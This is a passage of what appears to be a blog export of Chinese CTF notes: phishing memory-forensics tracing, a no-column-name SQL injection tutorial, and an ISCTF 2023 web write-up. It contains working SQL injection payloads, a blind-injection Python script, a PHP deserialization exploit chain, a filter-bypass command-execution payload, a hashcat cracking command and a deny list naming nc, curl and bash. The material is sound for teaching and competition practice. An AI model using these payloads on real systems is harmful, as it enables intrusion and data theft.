href="http://192.168.150.1/test.zip/">http://192.168.150.1/test.zip/</a>，链接目录结尾保留“/”}）<br>例如：钓鱼攻击使用网站标题是”系统检查”,钓鱼攻击使用的恶意程序http下载链接是<a href="http://192.168.20.23:9999/hello.zip/">http://192.168.20.23:9999/hello.zip/</a>，flag即为flag{md5(系统检查+<a href="http://192.168.20.23:9999/hello.zip/">http://192.168.20.23:9999/hello.zip/)</a>)}即flag{8d58631224fd41cb30d94edb9e1e9b77}<br>这里直接010打开镜像文件检索<code>[http://192](http://192)</code> 右下角改为显示文本和utf-8编码<br><img src="/mdimg/memprocfs/5.png"><br>得到下载链接<br><code>http://192.168.2.113:2222/Patch_Update.zip/</code><br>网站标题<br><code>医疗系统补丁更新下载站</code><br>这里有一个工具<a href="https://www.gimp.org/">GIMP - GNU Image Manipulation Program</a> 是一个类似ps的图像编辑器<br>可以导入如.raw的镜像来查看数据<br>找到<code>M:\name\msedge.exe-7276\minidump</code> 的<code>.dmp</code>文件 改后缀为<code>.data</code>然后拖进gimp<br>调整图像宽高可以看到<br><img src="/mdimg/memprocfs/6.png"></p><h3 id="鱼叉攻击场景溯源-3"><a href="#鱼叉攻击场景溯源-3" class="headerlink" title="鱼叉攻击场景溯源_3"></a>鱼叉攻击场景溯源_3</h3><p>题目内容：<br>请分析钓鱼攻击使用的恶意程序软件，还原恶意程序软件名及植入木马程序的命令(答案格式为flag{恶意程序软件名+恶意命令的小写md5值}，恶意程序软件名包括文件名和文件大写扩展名，例如name.EXE，去除恶意命令中的“,”号，命令中空格间隔均为1个)<br>例如恶意程序软件名是shell.exe,恶意命令为curl.exe <a href="http://www.baidu.com,flag即为flag{md5/">www.baidu.com,flag即为flag{md5</a>(shell.exe+curl.exe <a href="http://www.baidu.com)}即flag{4b17c1d9b0e22e773554f91994db048b}/">www.baidu.com)}即flag{4b17c1d9b0e22e773554f91994db048b}</a><br>待定</p><h3 id="鱼叉攻击场景溯源-4"><a href="#鱼叉攻击场景溯源-4" class="headerlink" title="鱼叉攻击场景溯源_4"></a>鱼叉攻击场景溯源_4</h3><p>题目内容：<br>钓鱼攻击后该系统被植入的木马程序为（答案格式为flag{木马程序软件名+木马程序回连地址的md5值}，回连地址格式为ip:port，例如192.168.150.1:443）<br>例如192.168.150.1:443对应的flag是flag{md5(192.168.150.1:443)}即flag{05bb4939f4da0952d17f3a8fec3fbbf2}<br>查看<code> &quot;M:\sys\net\netstat-v.txt&quot;</code> 文件<br><img src="/mdimg/memprocfs/7.png"><br>可以看到这个helper.exe是上面钓鱼网站下载下来的木马程序<br>并且可以得到与主机通讯连接的ip端口 为 <code>192.168.2.120:8023</code></p><h3 id="鱼叉攻击场景溯源-5"><a href="#鱼叉攻击场景溯源-5" class="headerlink" title="鱼叉攻击场景溯源_5"></a>鱼叉攻击场景溯源_5</h3><p>题目内容：<br>该受灾系统曾经备份过的操作用户表中的admin用户明文为（答案格式为flag{admin用户明文密码的16进制值的md5值}，密码破解字典可使用kali自带密码本进行）<br>例如：admin明文是hello123，对应的16进制值就是68656c6c6f313233，md5值就是md5(68656c6c6f313233)最终结果为d2c4b16c3624a40efc2f28d7aa54f8c2，再加上flag{}即flag{d2c4b16c3624a40efc2f28d7aa54f8c2}<br>找到记事本的进程 <code>M:\name\Notepad.exe-4920</code><br><code>M:\name\Notepad.exe-4920\minidump</code> 把.bmp改为.data 然后gimp打开<br><img src="/mdimg/memprocfs/8.png"><br><code>6d1ce7aa0a1d988dc96a2abcd187b45a</code><br>用hashcat爆破<br><code>hashcat -a 0 -m 0 6d1ce7aa0a1d988dc96a2abcd187b45a ./misc/rockyou.txt</code><br><img src="/mdimg/memprocfs/9.png"><br><code>aptx4869</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无列名注入</title>
    <link href="/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><strong>通常情况是columns被ban了或者information被ban了 等读取不到列名的情况</strong></p><h3 id="information被ban时可以用以下表获取表名然后配合无列名注入"><a href="#information被ban时可以用以下表获取表名然后配合无列名注入" class="headerlink" title="information被ban时可以用以下表获取表名然后配合无列名注入"></a>information被ban时可以用以下表获取表名然后配合无列名注入</h3><p>注：sys库需要root权限才能访问。innodb在mysql中是默认关闭的。</p><h4 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h4><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，<strong>但是没有存储列名</strong>。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql.innodb<span class="hljs-emphasis">_table_stats</span><br><span class="hljs-emphasis">mysql.innodb_index_</span>stats<br></code></pre></td></tr></table></figure><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取<strong>表名</strong>。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics<br>sys.x$ps_schem<span class="hljs-built_in">a_table</span>_statistics_io<br>sys.x$schem<span class="hljs-built_in">a_flattened</span>_keys<br></code></pre></td></tr></table></figure><h3 id="没ban掉union可以用设置别名的方式来绕过列名"><a href="#没ban掉union可以用设置别名的方式来绕过列名" class="headerlink" title="没ban掉union可以用设置别名的方式来绕过列名"></a>没ban掉union可以用设置别名的方式来绕过列名</h3><p><strong>union可以构造一个虚拟表</strong><br><code> select 1,2,3,4 union select *from teacher</code><br><img src="/mdimg/wlmzr/1.png"><br>**select的字段数要和table一样 **<br>后面就可以用<br><code>select </code>2<code> from (select 1,2,3,4 union select *from teacher)n //n不可省略(作用是设置别名)</code><br><img src="/mdimg/wlmzr/2.png"><br>这种来读取数据而不需要知道原先表的列名<br>ban了````时可以设置别名 <code>as</code>可以省略<br><code>select b from (select 1 a,2 b,3 c,4 d union select *from teacher)n</code><br><img src="/mdimg/wlmzr/3.png"></p><h3 id="通过ascii位移无列名注入"><a href="#通过ascii位移无列名注入" class="headerlink" title="通过ascii位移无列名注入"></a>通过ascii位移无列名注入</h3><p>首先可以通过类似这样的语句爆出字段数<br><code>(select 1,2,3) &gt; (select *from teacher)</code><br>字段数相等会返回1，不相等则会报错<br><img src="/mdimg/wlmzr/4.png"><br>然后可以通过比较ascii大小来爆出数据<br><img src="/mdimg/wlmzr/5.png"><br>实际上是比较每一个字符的ascii 然后返回0 false 或者 1 true<br>然后可以比较表中数据来盲注<br><code>select (select &#39;flag&#39;) &gt; (select *from test)</code><br><img src="/mdimg/wlmzr/6.png"><br>跟&gt;的布尔盲注类似 返回1的前一个ASCII字符就是表中数据<br>贴个jio本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span>  requests<br><br>baseurl=<span class="hljs-string">&quot;http://17d5864a-27fc-4fc7-be88-e639f3f55898.node4.buuoj.cn:81/index.php&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">flag</span>):<br>    res=<span class="hljs-string">&#x27;&#x27;</span><br>    res+=flag<br>    <span class="hljs-keyword">return</span> res<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        datachar = add(flag+<span class="hljs-built_in">chr</span>(char)) <span class="hljs-comment">#增加下一个比对的字符串</span><br>        payload=<span class="hljs-string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(datachar)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>:payload<br>        &#125;<br>        req=requests.post(url=baseurl,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> req.text:<br>            flag += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> req.status_code == <span class="hljs-number">429</span>:<br>            time.sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure><h3 id="ban-了columns-但没ban掉information"><a href="#ban-了columns-但没ban掉information" class="headerlink" title="ban 了columns 但没ban掉information"></a>ban 了columns 但没ban掉information</h3><p>join 的作用是连接两个表<br>在使用别名的时候，表中不能出现相同的字段名<br><code>(select * from (select * from test as a join test as b) as c);</code><br><strong>a、b是同一个表连接，有相同的字段，select c(别名) 时 会报错出相同的列名</strong><br>ps：<br>SELECT *时，USING会去除USING指定的列 ，可以用来爆破其他列名<br><code>(select * from (select * from test as a join test as b using(id)) as c);</code></p><h3 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h3><p><strong>fuzz</strong><br>过滤了：</p><ul><li>database</li><li>= //用 like</li><li>union</li><li>and //用 or</li><li>columns</li><li>sleep</li><li>updatexml //extractvalue</li><li>substr //mid or limit</li><li>left</li><li>right</li></ul><p>ban了database<br><code>tt=1&#39;or(select *from a)#</code>  通过不存在的表爆出库名 sqlsql<br>不知道为什么这里用<code>or</code>就不行要用 <code>||</code><br><code>tt=1&#39; || (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#39;sqlsql&#39;))))# </code><br>表：<code>Fal_flag , output</code><br><code>columns</code>被ban了<br>无列名注入：<br>这里<code>as</code>被ban了<br>可以省略as 设置别名<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from output a join output b) c)))#</code><br>-&gt;  data<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b) c)))#</code><br>-&gt;  id<br>爆数据<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select data from output)))#</code><br>-&gt;   NSSCTF{752a1163-4e92-47d5-91<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,mid((select data from output),29,48)))#</code><br>-&gt;   9b-ef75c021f69e}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF 2023 wp</title>
    <link href="/2023/11/29/ISCTF%202023/"/>
    <url>/2023/11/29/ISCTF%202023/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://43.249.195.138:22515/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=1&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&#x27;pan[gu&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span>*<span class="hljs-number">250000</span>+<span class="hljs-string">&#x27;2023ISCTF&#x27;</span><br>&#125;<br>r=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h3><p>flag.php flag2 env</p><h3 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争!!!"></a><strong>圣杯战争!!!</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;为Saber选择了对的武器!&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蓄力!咖喱棒！！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>  &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;胜利！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>  &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$Rider</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;开始召唤从者！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">summon::<span class="hljs-title function_ invoke__">__wakeup</span>()-&gt;artifact::<span class="hljs-title function_ invoke__">__toString</span>()-&gt;prepare::<span class="hljs-title function_ invoke__">__get</span>()-&gt;saber::<span class="hljs-title function_ invoke__">__invoke</span>()::<span class="hljs-keyword">include</span>()<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> summon;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> artifact;<br><span class="hljs-variable">$a</span>-&gt;Saber=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">prepare</span>();<br><span class="hljs-variable">$b</span>-&gt;excalibuer=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Saber</span>;<br><span class="hljs-variable">$d</span>-&gt;weapon=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;release=<span class="hljs-variable">$d</span>;<br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// O:6:&quot;summon&quot;:1:&#123;s:5:&quot;Saber&quot;;O:8:&quot;artifact&quot;:2:&#123;s:10:&quot;excalibuer&quot;;O:7:&quot;prepare&quot;:1:&#123;s:7:&quot;release&quot;;O:5:&quot;saber&quot;:1:&#123;s:6:&quot;weapon&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;s:5:&quot;arrow&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a><strong>wafr</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123; <span class="hljs-comment">//strings</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;想读我文件？大胆。&quot;</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;无字母数字RCE？大胆！&quot;</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;奇技淫巧？大胆！！&quot;</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;大胆！！！&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">code=<span class="hljs-title function_ invoke__">print_r</span>(`c\at /f*`)<br></code></pre></td></tr></table></figure><h3 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a><strong>easy_website</strong></h3><p>报错注入<br>注入点在username</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span><span class="hljs-string">&#x27;anandd(selselectect/**/extractvalue(1,concat(0x7e,database())))#      </span><br><span class="hljs-string">-&gt;  users</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-title function_ invoke__">anandd</span>(selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,(selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">group_concat</span>(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span>where <span class="hljs-comment">/**/</span>table_schema=<span class="hljs-title function_ invoke__">database</span>()))))<span class="hljs-comment">#</span><br>-&gt;  users<br><br><span class="hljs-string">&#x27;anandd(selselectect/**/extractvalue(1,concat(0x7e,(selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where /**/table_name=database()))))#</span><br><span class="hljs-string">-&gt;user,password,USER</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-title function_ invoke__">anandd</span>(selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">substr</span>((selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">group_concat</span>(passwoorrd)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>users),<span class="hljs-number">67</span>,<span class="hljs-number">98</span>))))<span class="hljs-comment">#</span><br>ISCTF&#123;<span class="hljs-number">94e8</span>d704-e303-<span class="hljs-number">4</span>fa2-<span class="hljs-number">8</span>ff<br><br><span class="hljs-string">&#x27;anandd(selselectect/**/extractvalue(1,concat(0x7e,substr((selselectect/**/group_concat(passwoorrd)/**/from/**/users),95,111))))#</span><br><span class="hljs-string">f-1d53192b3a22&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">ISCTF&#123;94e8d704-e303-4fa2-8fff-1d53192b3a22&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a><strong>ez_ini</strong></h3><p>日志包含+.user.ini<br>nginx日志路径 /var/log/nginx/access.log<br><img src="/mdimg/isctf2023/1.png"><br>当前目录下有一个upload.php auto_prepend_file把木马加在这个php文件里<br><img src="/mdimg/isctf2023/2.png"></p><h3 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a><strong>webinclude</strong></h3><p><img src="/mdimg/isctf2023/3.png"><br>逆一下index.bak里的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 